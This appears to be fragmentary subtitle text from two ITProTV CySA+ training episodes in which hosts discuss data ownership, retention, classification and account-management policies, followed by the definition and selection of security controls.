somehow, those same end users\n\n358\n00:17:20.218 --> 00:17:22.048\nare able to bypass security and go to-\n&gt;&gt; [COUGH]\n\n359\n00:17:22.048 --> 00:17:23.590\n&gt;&gt;

Yeah, absolutely.\n\n363\n00:17:30.384 --> 00:17:31.694\nAnd a quick Google search, half the time-\n\n364\n00:17:31.694 --> 00:17:32.478\n&gt;&gt; Yeah.\n&gt;&gt; Will\n\n365\n00:17:32.478 --> 00:17:33.070\nfind a nice article.\n&gt;&gt;

Mm-hm.\n\n379\n00:18:04.801 --> 00:18:06.953\n&gt;&gt; So if you're in an organization,\n\n380\n00:18:06.953 --> 00:18:10.442\nMIke and I work together,\nwe're a two-man team here,\n\n381\n00:18:10.442 --> 00:18:13.944\nwe've created an LLC to do\ncomputer security, right?\n\n382\n00:18:13.944 --> 00:18:16.010\nWe buy a couple of computers,\nbut who owns those computers?\n\n383\n00:18:16.010 --> 00:18:17.637\nDoes the company own the computers?\n\n384\n00:18:17.637 --> 00:18:19.387\nDo I own it, is it my personal thing?\n\n385\n00:18:19.387 --> 00:18:24.225\nAnd when I do that, when I work on,\nsay computers, even if it is mine,\n\n386\n00:18:24.225 --> 00:18:29.563\nwhen I'm on work hours, the data that\nI create during that time, is it mine?\n\n387\n00:18:29.563 --> 00:18:33.069\nCan I do anything I want with it,\nor does it belong to the company?\n\n388\n00:18:33.069 --> 00:18:36.077\nAnd It could be both.\n&gt;&gt; Right, it could be either one.\n\n389\n00:18:36.077 --> 00:18:37.099\n&gt;&gt; It could be both,\n\n390\n00:18:37.099 --> 00:18:41.947\nit depends on the policy that you created,\nsay, this is our data ownership policy.\n\n391\n00:18:41.947 --> 00:18:45.538\nSo if during my free time,\nwhen I'm just kinda lying and waiting for\n\n392\n00:18:45.538 --> 00:18:47.307\nthe phone to ring, or whatever.\n\n393\n00:18:47.307 --> 00:18:50.265\nI'm over there writing\nthe great American novel-\n\n394\n00:18:50.265 --> 00:18:51.067\n&gt;&gt;

Even if it was put on company systems,\n\n398\n00:18:58.200 --> 00:19:02.453\nusing company data retention and\nall that, is it my IP or\n\n399\n00:19:02.453 --> 00:19:05.448\ndoes it somehow belong to the company?\n\n400\n00:19:05.448 --> 00:19:09.019\nYou have to define these things because,\nif you don't, you're gonna find yourself\n\n401\n00:19:09.019 --> 00:19:10.171\none day in a legal battle-\n&gt;&gt; Mm-hm.\n\n402\n00:19:10.171 --> 00:19:12.121\n&gt;&gt; With Mike over there going, well,\n\n403\n00:19:12.121 --> 00:19:14.982\nyou know this story about the boy and\nhis dog is mine.\n\n404\n00:19:14.982 --> 00:19:16.334\n&gt;&gt;

Mm-hm.\n\n408\n00:19:20.505 --> 00:19:22.683\n&gt;&gt; You did it on my computer,\n\n409\n00:19:22.683 --> 00:19:26.250\nduring work hours, we facilitated that.\n\n410\n00:19:26.250 --> 00:19:30.876\nSo when we see how the legal part of\nthe thing starts really coming into play,\n\n411\n00:19:30.876 --> 00:19:32.554\nit can just be a nightmare.\n\n412\n00:19:32.554 --> 00:19:37.084\nSo it's just easier to say,\nhere is our data ownership policy.\n\n413\n00:19:37.084 --> 00:19:42.099\nIf you create data during XYZ times, on XY\nand Z systems, that data is in, some way,\n\n414\n00:19:42.099 --> 00:19:46.923\nshape, or form, ours, or not ours,\njust get those definitions hammered out.\n\n415\n00:19:46.923 --> 00:19:50.862\nAnd, [COUGH] make them available to\nyour users so they understand them, and\n\n416\n00:19:50.862 --> 00:19:51.744\nthey know them.\n\n417\n00:19:51.744 --> 00:19:53.650\nAll right, let's see,\nmoving on, data retention.\n\n418\n00:19:53.650 --> 00:19:57.374\nI did kinda mention that just a second\nago, how long do we keep said data?\n\n419\n00:19:57.374 --> 00:19:59.079\nThis is actually a very important thing.\n\n420\n00:19:59.079 --> 00:20:03.518\nAnd I've seen this come into play as\nI worked in an insurance company,\n\n421\n00:20:03.518 --> 00:20:04.297\nguess what?\n\n422\n00:20:04.297 --> 00:20:07.064\nInsurance companies gets sued, a lot.\n&gt;&gt; [LAUGH]\n\n423\n00:20:07.064 --> 00:20:09.143\n&gt;&gt; [LAUGH] Yeah, because they think,\n\n424\n00:20:09.143 --> 00:20:11.427\nyour policies do not pay out.\n&gt;&gt; Mm-hm.\n\n425\n00:20:11.427 --> 00:20:14.259\n&gt;&gt; And I've actually got mint copies and\n\n426\n00:20:14.259 --> 00:20:19.219\nduplicates for legal teams of\nfootage by private investigators,\n\n427\n00:20:19.219 --> 00:20:25.326\npeople that were claiming that they were\ninjured, and wanting to get a payout from\n\n428\n00:20:25.326 --> 00:20:28.978\nthe insurance company over their injury.\n&gt;&gt;

But how do we do that?\n\n457\n00:21:33.623 --> 00:21:36.047\nWhat is the policy for data retention and\n\n458\n00:21:36.047 --> 00:21:39.266\ndata destruction once\nthe retention period is over.\n\n459\n00:21:39.266 --> 00:21:41.474\nWe have to figure that out.\n\n460\n00:21:41.474 --> 00:21:44.394\nBut that aint our policy so\nthat everybody is able to adhere to it.\n\n461\n00:21:44.394 --> 00:21:48.835\nAnd if we give a subpoena for a said data,\nThat's already been destroyed in some way,\n\n462\n00:21:48.835 --> 00:21:49.651\nshape of form.\n\n463\n00:21:49.651 --> 00:21:54.730\nThey go \" we want data from four years\nago.\" I'm sorry about that there,\n\n464\n00:21:54.730 --> 00:21:56.463\ncuz today, that data gone.\n\n465\n00:21:56.463 --> 00:21:59.771\nCuz our policy says \"We only do two\nyears of retention.\" After that,\n\n466\n00:21:59.771 --> 00:22:02.100\nit's destroyed in a way\nthat's unrecoverable.\n\n467\n00:22:02.100 --> 00:22:04.378\nSo, there you go.\n&gt;&gt; And important to have that stuff.\n\n468\n00:22:04.378 --> 00:22:06.990\nYou know, we talked about\nhaving these policies in place.\n\n469\n00:22:06.990 --> 00:22:08.137\nAnd something like that is.\n\n470\n00:22:08.137 --> 00:22:12.371\nimportant in a couple of ways as you said\ntalking about how long we should keep that\n\n471\n00:22:12.371 --> 00:22:16.104\ndata, but also one of the things if we\never have to go in front of a judge,\n\n472\n00:22:16.104 --> 00:22:20.060\nif we have to to go to court, we wanna\nbe able to show that this is our policy.\n\n473\n00:22:20.060 --> 00:22:23.864\nWe didn't just destroy this data\nto try and cover evidence and\n\n474\n00:22:23.864 --> 00:22:26.509\nyou come up with\nthe policy after the fact.\n\n475\n00:22:26.509 --> 00:22:30.803\nIf this policy's been in place for years\nand we've been following this policy It's\n\n476\n00:22:30.803 --> 00:22:33.417\ngonna look much better in\nthe courtroom scenario.\n\n477\n00:22:33.417 --> 00:22:34.706\n&gt;&gt; That's exactly right,\n\n478\n00:22:34.706 --> 00:22:39.130\nthe last thing when it comes to polices,\nI'm gonna say data classification policy.\n\n479\n00:22:39.130 --> 00:22:43.750\nHow do I classify, is this secret,\nis this top secret, is it confidential,\n\n480\n00:22:43.750 --> 00:22:45.681\nis it, you know, general use?\n\n481\n00:22:45.681 --> 00:22:49.340\nWhat are my data classifications,\nhow have I defined those?\n\n482\n00:22:49.340 --> 00:22:53.095\nAnd then how am I to distribute\nthat out to my user base, so\n\n483\n00:22:53.095 --> 00:22:54.908\nthat they can follow that.\n\n484\n00:22:54.908 --> 00:22:59.972\nAgain, you create that policy that says\nhere, this document had these types of\n\n485\n00:22:59.972 --> 00:23:04.976\ncriteria that we have laid out that say\nwell, that should have been eyes only.\n\n486\n00:23:04.976 --> 00:23:08.332\nThat should've been classified,\nor level one, level two,\n\n487\n00:23:08.332 --> 00:23:11.892\nlevel three, whatever classification\nsystem you come up with.\n\n488\n00:23:11.892 --> 00:23:14.379\nPut that into effect,\nmake a policy out of it.\n\n489\n00:23:14.379 --> 00:23:18.825\nIt's one thing we've got, wow,\nwe've made a classification system, great.\n\n490\n00:23:18.825 --> 00:23:19.964\n&gt;&gt; [LAUGH]\n\n491\n00:23:19.964 --> 00:23:21.117\n&gt;&gt; How are you enforcing it?\n\n492\n00:23:21.117 --> 00:23:27.965\nThis really comes to the idea of\nwhy we're talking about this stuff.\n\n493\n00:23:27.965 --> 00:23:31.950\nIs ultimately, it's gonna come to a day\nyou wanna check and make sure that all\n\n494\n00:23:31.950 --> 00:23:36.489\nthe securities, controls, and policies,\nprocedures put in place are actually kinda\n\n495\n00:23:36.489 --> 00:23:40.309\nuseful and not just you [LAUGH] Sound and\nfury signifying nothing, right.\n\n496\n00:23:40.309 --> 00:23:42.922\nYou wanna make sure they're\nactually doing the thing,\n\n497\n00:23:42.922 --> 00:23:44.985\nyou wanna audited in some way shape or\nform.\n\n498\n00:23:44.985 --> 00:23:48.645\nAnd when that audit happens,\nguess what the auditor's gonna do?\n\n499\n00:23:48.645 --> 00:23:50.779\nHe's gonna say, well,\nwhat's your policy on that?\n\n500\n00:23:50.779 --> 00:23:52.665\nWhat do you mean?\n\n501\n00:23:52.665 --> 00:23:56.741\nWell you said you created a data\nclassification system, wonderful.\n\n502\n00:23:56.741 --> 00:24:00.196\nHow are you implementing it and\nis that implementation actually happening?\n\n503\n00:24:00.196 --> 00:24:02.301\nShow me that, don't tell me that,\n\n504\n00:24:02.301 --> 00:24:07.214\nI guarantee this is what you're gonna hear\nfrom your auditor cuz I've been there,\n\n505\n00:24:07.214 --> 00:24:12.070\nI've been audited multiple times,\nit's a weird thing to go through.\n\n506\n00:24:12.070 --> 00:24:16.035\nBut they want the proof, they wanna\nsee that especially on a formal audit,\n\n507\n00:24:16.035 --> 00:24:21.570\nthey're gonna wanna see that trail,\na following logic from start to finish.\n\n508\n00:24:21.570 --> 00:24:25.265\nSo you gotta be able to produce that and\ncreating that policy as part of it, and so\n\n509\n00:24:25.265 --> 00:24:26.530\nthat's enforceable.\n\n510\n00:24:26.530 --> 00:24:31.170\nOnce you created a policy you have the\nability to enforce that policy ontoyour\n\n511\n00:24:31.170 --> 00:24:35.210\nusers, get them to comply and\nif compliance is not met,\n\n512\n00:24:35.210 --> 00:24:39.620\nyou can then have some sorta sanctions for\nnon compliance.\n\n513\n00:24:39.620 --> 00:24:42.853\nNow Mike I know that we're\nrunning a little short on time,\n\n514\n00:24:42.853 --> 00:24:43.508\n&gt;&gt; We missed it,\n\n515\n00:24:43.508 --> 00:24:44.990\naccount management policies.\n\n516\n00:24:44.990 --> 00:24:46.658\nI wanted to make sure\nyou touched on that one.\n\n517\n00:24:46.658 --> 00:24:47.238\n&gt;&gt; Thank you, yes, thank you, sir.\n\n518\n00:24:47.238 --> 00:24:49.000\nWe've got a list of objectives\nwe wanted to hit them all.\n\n519\n00:24:49.000 --> 00:24:50.500\nMike's got an eagle eye over there.\n\n520\n00:24:50.500 --> 00:24:57.300\nAccount management policy, basically\ndefines how the life cycle of an accounts,\n\n521\n00:24:57.300 --> 00:25:00.820\nfrom creation to deletion,\nwe are the almighty gods of this thing.\n\n522\n00:25:00.820 --> 00:25:06.000\nBut we do like to put in a set of rules\non how that's meant to be done because\n\n523\n00:25:06.000 --> 00:25:08.230\nmaybe Mike and\nI share that responsibility.\n\n524\n00:25:08.230 --> 00:25:11.604\nAnd Mike could be over there going,\nwhat's going on with this account or\n\n525\n00:25:11.604 --> 00:25:15.370\nit just does something?\n&gt;&gt; There was a case not too long ago\n\n526\n00:25:15.370 --> 00:25:20.080\nSouth Florida Medical Organization\nfaced some major HIPAA of fines for\n\n527\n00:25:20.080 --> 00:25:22.250\nthis very topic.\n\n528\n00:25:22.250 --> 00:25:25.300\nOne of the problems we had with account\nmanagement is you get new hires,\n\n529\n00:25:25.300 --> 00:25:28.420\nyou make new accounts, you put them in\nthe right groups, you give them access.\n\n530\n00:25:28.420 --> 00:25:30.680\nAll that stuff's pretty standard fare.\n\n531\n00:25:30.680 --> 00:25:34.320\nUsually, where we see organizations\nslipping up is in the termination process,\n\n532\n00:25:34.320 --> 00:25:36.800\nfor when users leave the organization.\n\n533\n00:25:36.800 --> 00:25:38.140\nWhat happens to that account?\n\n534\n00:25:38.140 --> 00:25:40.440\nDo we disable it, do we keep it but\n\n535\n00:25:40.440 --> 00:25:43.540\ndisable it to make sure if we\nneed it we can get back into it?\n\n536\n00:25:43.540 --> 00:25:44.250\nDo we delete it?\n\n537\n00:25:44.250 --> 00:25:46.700\nHow do we handle that?\n\n538\n00:25:46.700 --> 00:25:51.490\nAnd with this firm down in South Florida,\nthey got hit with fines because they had\n\n539\n00:25:51.490 --> 00:25:55.600\nseveral accounts of employees that were\nno longer with the organization but\n\n540\n00:25:55.600 --> 00:25:57.110\nthe accounts were still active.\n\n541\n00:25:57.110 --> 00:26:00.660\nAnd set accounts were\nused to access HIPAA or\n\n542\n00:26:00.660 --> 00:26:02.230\nPII, Personal.\n&gt;&gt; Or the PHI,\n\n543\n00:26:02.230 --> 00:26:03.460\nPersonal Health Information.\n&gt;&gt; Yeah\n\n544\n00:26:03.460 --> 00:26:05.240\nthe Personal Health Information.\n&gt;&gt; Yeah.\n\n545\n00:26:05.240 --> 00:26:06.900\n&gt;&gt; And so HIPAA came in,\n\n546\n00:26:06.900 --> 00:26:11.170\nthey find them like $10,000 per\ninstance of each account I think\n\n547\n00:26:11.170 --> 00:26:14.210\nthat was still active where the employee\nhave been gone for over a year.\n\n548\n00:26:14.210 --> 00:26:18.610\nFor each individual record that\nwas accessed by those accounts,\n\n549\n00:26:18.610 --> 00:26:22.215\nbecause each one of those, each individual\ninstance is a violation, right?\n\n550\n00:26:22.215 --> 00:26:25.150\nHere's an account that, that gives\ninformation that it should have access to,\n\n551\n00:26:25.150 --> 00:26:28.800\nin fact that account should\nhave been disabled a year ago.\n\n552\n00:26:28.800 --> 00:26:32.290\nSo when you talk about account management\nit's something that you can't just,\n\n553\n00:26:32.290 --> 00:26:36.040\nit's not that big of deal, it is\ndefinitely have that policies in place\n\n554\n00:26:36.040 --> 00:26:40.390\nthat control when somebody gets\nterminated, what is our procedure?\n\n555\n00:26:40.390 --> 00:26:41.600\nHow do we handle that account?\n\n556\n00:26:41.600 --> 00:26:42.820\nCuz we can't just delete it.\n\n557\n00:26:42.820 --> 00:26:44.714\nThere could be encrypted\ndata associated with it.\n\n558\n00:26:44.714 --> 00:26:48.175\nWe also don't wanna just leave it as soon\nas [SOUND] that employee is gone, nobody\n\n559\n00:26:48.175 --> 00:26:52.069\nis ever gonna log on with that account.\n&gt;&gt; And, I'll tell you what, go ahead and\n\n560\n00:26:52.069 --> 00:26:55.765\nsay someone quits today,\nwalk right over there and right click and\n\n561\n00:26:55.765 --> 00:27:00.420\ndisable that account, which you should\nprobably do at that point in time.\n\n562\n00:27:00.420 --> 00:27:05.320\nBut I guarantee that in a lot of\norganizations someone's gonna go,\n\n563\n00:27:05.320 --> 00:27:06.760\nI can't get into such and such.\n\n564\n00:27:06.760 --> 00:27:07.440\nWhat do you mean?\n\n565\n00:27:07.440 --> 00:27:09.510\nWell I'm trying to use so\nand so's account and\n\n566\n00:27:09.510 --> 00:27:10.909\nI know they left but\n&gt;&gt; [LAUGH]\n\n567\n00:27:10.909 --> 00:27:11.720\n&gt;&gt; Well why were you trying to\n\n568\n00:27:11.720 --> 00:27:12.240\nuse their account?\n\n569\n00:27:12.240 --> 00:27:14.450\nBecause they were the one that did this\n&gt;&gt; Right.\n\n570\n00:27:14.450 --> 00:27:16.570\n&gt;&gt; Well you should have permissions to get\n\n571\n00:27:16.570 --> 00:27:19.080\ninto that if you do that at all,\nif you were the backup,\n\n572\n00:27:19.080 --> 00:27:22.595\nwell we didn't have a backup it was just\nthem Wait, and you know their password?\n\n573\n00:27:22.595 --> 00:27:23.135\n&gt;&gt; Right, yeah.\n\n574\n00:27:23.135 --> 00:27:23.905\n&gt;&gt; What's going on here?\n\n575\n00:27:23.905 --> 00:27:24.485\n&gt;&gt; Well, I was getting\n\n576\n00:27:24.485 --> 00:27:27.215\nready to delete this account\nbecause they're no longer with us,\n\n577\n00:27:27.215 --> 00:27:30.465\nbut don't that because the permissions\nare all tied to that account.\n\n578\n00:27:30.465 --> 00:27:34.295\nAgain, this goes to back to how you\nshould be properly putting permissions\n\n579\n00:27:34.295 --> 00:27:37.955\nonto groups and not onto users,\nthat old chestnut.\n\n580\n00:27:37.955 --> 00:27:39.955\nBut that's standard administrator stuff.\n\n581\n00:27:39.955 --> 00:27:42.455\nAnd back to your ownership earlier.\n&gt;&gt; We should,\n\n582\n00:27:42.455 --> 00:27:47.630\ncertain files we need to transfer\nownership to the company itself,\n\n583\n00:27:47.630 --> 00:27:49.200\nnot to individual users.\n&gt;&gt; So\n\n584\n00:27:49.200 --> 00:27:55.410\nthat's gonna be a make up part of your\naccount management policy that you create.\n\n585\n00:27:55.410 --> 00:27:56.800\nWhen do we disable?\n\n586\n00:27:56.800 --> 00:27:58.720\nWhen do we delete?\n\n587\n00:27:58.720 --> 00:28:01.120\nHow long do we retain, what access?\n\n588\n00:28:01.120 --> 00:28:01.970\nHow do we transfer?\n\n589\n00:28:01.970 --> 00:28:03.150\nWho does it go to?\n\n590\n00:28:03.150 --> 00:28:04.708\nAll that stuff has to come into play so\n\n591\n00:28:04.708 --> 00:28:08.480\nthat you can follow your little checklist\nand go ching, ching, ching, ching, ching,\n\n592\n00:28:08.480 --> 00:28:10.562\nwe did all those things,\nand I did it correctly.\n\n593\n00:28:10.562 --> 00:28:13.492\nYou're gonna be employing proper\nchange management in this where\n\n594\n00:28:13.492 --> 00:28:16.001\nyou put in the change request,\nthe request is approved,\n\n595\n00:28:16.001 --> 00:28:19.817\nit comes back, you perform the duties, you\ndocument the duties as you've done them,\n\n596\n00:28:19.817 --> 00:28:21.676\nas thoroughly and detailed as possible.\n\n597\n00:28:21.676 --> 00:28:25.750\nThen that goes back to the higher-ups,\nthen you have a complete change, right?\n\n598\n00:28:25.750 --> 00:28:27.380\nThese are the things that you\nhave to be following, and\n\n599\n00:28:27.380 --> 00:28:31.190\nwhen you don't have the policies in place\nto dictate that that's how it's gonna be,\n\n600\n00:28:31.190 --> 00:28:34.770\nthen it's gonna be this mad grab\nof whatever you wanna do, and\n\n601\n00:28:34.770 --> 00:28:36.980\neverybody's gonna be stomping\non everybody's toes.\n\n602\n00:28:36.980 --> 00:28:39.720\nAnd things are gonna get shuffled around,\nand things are gonna happen and\n\n603\n00:28:39.720 --> 00:28:45.130\nyou're gonna find yourself in probably\nsome sort of legal or financial problem so\n\n604\n00:28:45.130 --> 00:28:48.720\nyou want to avoid that, policy is a really\ngood way to keep that from happening.\n\n605\n00:28:48.720 --> 00:28:52.730\nAgain Mike I know we're super short on\ntime now We took it a little bit farther,\n\n606\n00:28:52.730 --> 00:28:53.670\nwe got more to go so\n\n607\n00:28:53.670 --> 00:28:57.055\npart two is definitely on the horizon\n&gt;&gt;

00:00:09.667\n[CROSSTALK]\n&gt;&gt; You're\n\n4\n00:00:09.667 --> 00:00:12.798\nwatching ITProTV.\n&gt;&gt; Hello,\n\n5\n00:00:12.798 --> 00:00:15.052\nwelcome to another exciting\nepisode here at ITProTV.\n\n6\n00:00:15.052 --> 00:00:16.900\nI'm your host, Mike Rodrick.\n\n7\n00:00:16.900 --> 00:00:20.607\nThey were doing our CySA+ in this episode.\n\n8\n00:00:20.607 --> 00:00:23.730\nWe're doing a part two to our policies,\ncontrols, and procedures.\n\n9\n00:00:23.730 --> 00:00:26.265\nBack in the studios is none other than Mr.\nDaniel Lowrie.\n\n10\n00:00:26.265 --> 00:00:28.140\nWelcome back, Daniel.\n&gt;&gt; Thanks for having me, yet again, Mike,\n\n11\n00:00:28.140 --> 00:00:30.700\nback for the policies,\ncontrols, and procedures.\n\n12\n00:00:30.700 --> 00:00:34.900\nI know you guys are proabably just all\ntither and vibrating from the excitement\n\n13\n00:00:34.900 --> 00:00:37.186\nof the previous episode.\n&gt;&gt; [LAUGH]\n\n14\n00:00:37.186 --> 00:00:39.078\n&gt;&gt; Hopefully we made that content as\n\n15\n00:00:39.078 --> 00:00:40.910\nleast digestible as possible.\n\n16\n00:00:40.910 --> 00:00:43.710\nWe're gonna try to do the same here\nbecause it's a little bit more of\n\n17\n00:00:43.710 --> 00:00:47.928\nthe definitional things that we need to\nknow when it comes to our CySA+ exam.\n\n18\n00:00:47.928 --> 00:00:50.460\nBut we're gonna tackle\nit as hard as we can,\n\n19\n00:00:50.460 --> 00:00:53.990\npicking right back up where we\nleft off moving into controls.\n\n20\n00:00:53.990 --> 00:00:56.740\nMike, you've done this\nkind of stuff before.\n\n21\n00:00:56.740 --> 00:00:57.420\n&gt;&gt; Once or twice.\n\n22\n00:00:57.420 --> 00:00:58.890\n&gt;&gt; You've worked with controls.\n\n23\n00:00:58.890 --> 00:01:03.600\nI find it interesting, I found kind\nof a few different ways in which\n\n24\n00:01:03.600 --> 00:01:06.410\npeople defined controls.\n&gt;&gt; What would you say is a quick and\n\n25\n00:01:06.410 --> 00:01:08.580\ndirty way to define a control?\n&gt;&gt; Gosh,\n\n26\n00:01:08.580 --> 00:01:11.580\njust something that I can\nput in place to help us\n\n27\n00:01:11.580 --> 00:01:14.485\nstay compliant or monitor compliance?\n&gt;&gt; I think\n\n28\n00:01:14.485 --> 00:01:15.367\nthat's a good-\n&gt;&gt; Would be-\n\n29\n00:01:15.367 --> 00:01:18.220\n&gt;&gt; That's a decent definition actually.\n\n30\n00:01:18.220 --> 00:01:20.816\nI came up with this very\ntechnical definition, so I was so\n\n31\n00:01:20.816 --> 00:01:22.070\nproud that I wrote it down.\n\n32\n00:01:22.070 --> 00:01:23.470\nI'm gonna say it.\n\n33\n00:01:23.470 --> 00:01:28.080\nThese are the technical or administrative\ndefenses input to reduce loss of\n\n34\n00:01:28.080 --> 00:01:31.830\navailability because of threats leveraged\nagainst a corresponding vulnerability.\n\n35\n00:01:31.830 --> 00:01:33.202\n&gt;&gt; Cool, I like it.\n\n36\n00:01:33.202 --> 00:01:34.757\n&gt;&gt; Right, so that's very wordy and\n\n37\n00:01:34.757 --> 00:01:36.450\nverbose.\n&gt;&gt; But it says a lot.\n\n38\n00:01:36.450 --> 00:01:38.090\n&gt;&gt; It does say a lot but this,\n\n39\n00:01:38.090 --> 00:01:41.332\nthen I looked at it and went, so it's\nthe stuff we do to keep ourselves safe.\n\n40\n00:01:41.332 --> 00:01:42.078\n&gt;&gt; Yeah, right.\n\n41\n00:01:42.078 --> 00:01:44.195\n&gt;&gt; [LAUGH] These are the controls, right,\n\n42\n00:01:44.195 --> 00:01:45.680\nthat's what a control is.\n\n43\n00:01:45.680 --> 00:01:47.234\nThese are the things that\nwe do to keep us safe.\n\n44\n00:01:47.234 --> 00:01:48.552\n&gt;&gt; Yeah, it's how we implement, right?\n\n45\n00:01:48.552 --> 00:01:52.385\nWe've spent the previous episode talking\nabout policies and the importance of\n\n46\n00:01:52.385 --> 00:01:56.348\npolicies, existing regulations, policies\nthat we create as an organization.\n\n47\n00:01:56.348 --> 00:01:58.904\nAnd it's all well and\ngood to say that, hey,\n\n48\n00:01:58.904 --> 00:02:03.292\nyou're not allowed to go to Facebook\nfrom a work computer during work hours.\n\n49\n00:02:03.292 --> 00:02:04.224\nIt's in our policies.\n\n50\n00:02:04.224 --> 00:02:05.384\nYou can't do that,\nfrom a work computer during work hours,\n\n51\n00:02:05.384 --> 00:02:06.080\nit's in our policy you can do that.\n\n52\n00:02:06.080 --> 00:02:07.708\nWhat's to stop them?\n\n53\n00:02:07.708 --> 00:02:09.609\nThat's where our controls come into place.\n\n54\n00:02:09.609 --> 00:02:11.855\nThis is how we implement policy, right?\n\n55\n00:02:11.855 --> 00:02:14.390\nHow do we force them to\ncreate a strong password?\n\n56\n00:02:14.390 --> 00:02:18.683\nHow do we make sure that data\nis retained for seven years?\n\n57\n00:02:18.683 --> 00:02:20.855\nWe put controls in place to do that.\n&gt;&gt; Yeah,\n\n58\n00:02:20.855 --> 00:02:23.170\nexactly, Mike's nail\non the head with that.\n\n59\n00:02:23.170 --> 00:02:24.720\nWhatever he just said, you memorize it.\n&gt;&gt; [LAUGH]\n\n60\n00:02:24.720 --> 00:02:25.750\n&gt;&gt; Tattoo it on your forehead,\n\n61\n00:02:25.750 --> 00:02:29.480\nlook at it in the mirror everyday, and\ngo, yeah, that's what a control is.\n\n62\n00:02:29.480 --> 00:02:33.430\nRight, it's how we enforce that policy,\nbasically.\n\n63\n00:02:33.430 --> 00:02:37.750\nAgain, like I said,\nthe things that we do, right,\n\n64\n00:02:37.750 --> 00:02:42.774\nthat action, the verb of doing\nto make sure that we are safe.\n\n65\n00:02:42.774 --> 00:02:44.630\nOkay, so\nlet's talk about control selection.\n\n66\n00:02:44.630 --> 00:02:47.750\nHow do we select different controls?\n\n67\n00:02:47.750 --> 00:02:50.610\nWhy would I choose one\ncontrol over another?\n\n68\n00:02:50.610 --> 00:02:52.726\nWell, if you're in a regulatory industry,\n\n69\n00:02:52.726 --> 00:02:56.050\ngood news is probably that stuff\nhas already been selected for you.\n\n70\n00:02:56.050 --> 00:02:58.870\nYou just saw the guidelines of procedures,\nplaced out in front of you.\n\n71\n00:02:58.870 --> 00:03:03.540\nAnd you go, this is what you do to\nimplement the policies that we say that\n\n72\n00:03:03.540 --> 00:03:06.310\nyou need to implement,\nall that stuff that's done.\n\n73\n00:03:06.310 --> 00:03:08.970\nYou just gotta follow the checklist and\nmake sure that it happens.\n\n74\n00:03:08.970 --> 00:03:11.700\nSo there's that, or it could just be,\n\n75\n00:03:11.700 --> 00:03:16.810\nwhat does our organization's\nsecurity endpoint wanna look like?\n\n76\n00:03:16.810 --> 00:03:20.276\nWhat do we want out of security?\n\n77\n00:03:20.276 --> 00:03:24.930\nAnd now we need to put the controls\nin place to attain that goal, okay?\n\n78\n00:03:24.930 --> 00:03:27.020\nSo it could be one or the other.\n\n79\n00:03:27.020 --> 00:03:33.312\nMoving on with that, we're gonna talk\nabout organizationally defined parameters.\n\n80\n00:03:33.312 --> 00:03:36.593\nAll right, so\nthe parameters could be, right,\n\n81\n00:03:36.593 --> 00:03:42.205\nwhat is basically what's most important\nversus what's least important, okay?\n\n82\n00:03:42.205 --> 00:03:49.470\nSo I might have a control that says create\na password that's 30 characters long.\n\n83\n00:03:49.470 --> 00:03:53.180\nOkay, seems a bit excessive.\n\n84\n00:03:53.180 --> 00:03:55.566\nBut for whatever reason,\n\n85\n00:03:55.566 --> 00:04:00.380\nyou can only use one through zero.\n&gt;&gt; [LAUGH]\n\n86\n00:04:00.380 --> 00:04:02.255\n&gt;&gt; So yes, it would be a long number, but\n\n87\n00:04:02.255 --> 00:04:05.740\na computer would be able to\nrun through that very quickly.\n\n88\n00:04:05.740 --> 00:04:09.430\nBut how am I implementing\nthe fact that people are using\n\n89\n00:04:09.430 --> 00:04:13.890\nthe right numerical values, or\nwhatever the case is, right?\n\n90\n00:04:13.890 --> 00:04:16.471\nSo the parameters might not be, or\n\n91\n00:04:16.471 --> 00:04:21.012\nthey might kind of move us in\nthe direction that we have to go.\n\n92\n00:04:21.012 --> 00:04:23.710\nHopefully that makes sense.\n\n93\n00:04:23.710 --> 00:04:27.640\nWe might have things,\ncircumstances around our organization\n\n94\n00:04:27.640 --> 00:04:32.270\nthat help define how the control\nwould be implemented.\n\n95\n00:04:32.270 --> 00:04:33.600\nOkay, so\n\n96\n00:04:33.600 --> 00:04:37.000\nthat's why when you look at regulatory\nprinciples, they've already done that.\n\n97\n00:04:37.000 --> 00:04:39.702\nThey say, well,\nthis is the environment that you are in.\n\n98\n00:04:39.702 --> 00:04:43.184\nThey've taken a hard look at,\nbecause of that environment, x, y, and\n\n99\n00:04:43.184 --> 00:04:45.560\nz factors are gonna come into play.\n\n100\n00:04:45.560 --> 00:04:47.510\nSo we're gonna go ahead and\nwork around that.\n\n101\n00:04:47.510 --> 00:04:48.020\nThey've already done.\n\n102\n00:04:48.020 --> 00:04:51.580\nBut if you're in an organization\nthat doesn't have that as well,\n\n103\n00:04:51.580 --> 00:04:57.230\nwhat would be a very handy thing to have,\nyou gotta do it yourself.\n\n104\n00:04:57.230 --> 00:04:59.860\nSo coming up with that, looking into\nthat can be a little difficult.\n\n105\n00:04:59.860 --> 00:05:05.030\nSo just be aware of that Sometimes you,\nlet's see here, more focus on most\n\n106\n00:05:05.030 --> 00:05:10.300\nimportant, least physical access, so\nthis was the idea they came up with.\n\n107\n00:05:10.300 --> 00:05:12.653\nSo let's say you got physical access to\n\n108\n00:05:12.653 --> 00:05:14.375\nR&amp;D of a robotics company.\n\n109\n00:05:14.375 --> 00:05:15.036\n&gt;&gt; Okay.\n&gt;&gt; Okay?\n\n110\n00:05:15.036 --> 00:05:18.156\nIs it more important that\nMike's password is strong, or\n\n111\n00:05:18.156 --> 00:05:22.836\nmore important that unauthorized personnel\ndid not get into the R&amp;D] section of our\n\n112\n00:05:22.836 --> 00:05:24.275\nrobots company, right?\n\n113\n00:05:24.275 --> 00:05:28.787\nSo Mike's a user and, right,\nhe's data entry maybe,\n\n114\n00:05:28.787 --> 00:05:34.739\nshould I be putting more stringent\ncontrols on Mike's password policy or\n\n115\n00:05:34.739 --> 00:05:40.116\nhis ability to physically access\nthe R&amp;D area and take pictures,\n\n116\n00:05:40.116 --> 00:05:44.910\ngrab disks, drives and walk out with them.\n\n117\n00:05:44.910 --> 00:05:46.470\nWhat would be more important?\n\n118\n00:05:46.470 --> 00:05:49.800\nI would say that physical access\nis probably more important\n\n119\n00:05:49.800 --> 00:05:50.634\nthan Mike's password policy.\n\n120\n00:05:50.634 --> 00:05:53.404\nThis password policy is important-\n&gt;&gt; Right.\n\n121\n00:05:53.404 --> 00:05:55.931\n&gt;&gt; But it's not as important as being\n\n122\n00:05:55.931 --> 00:05:59.936\nable, so I'm going to spend more time,\nmore effort,\n\n123\n00:05:59.936 --> 00:06:04.640\nmore resource on suring up\nthe controls around gaining access to\n\n124\n00:06:04.640 --> 00:06:08.343\nthe R&amp;D section of our robotics company.\n&gt;&gt; Yeah, and\n\n125\n00:06:08.343 --> 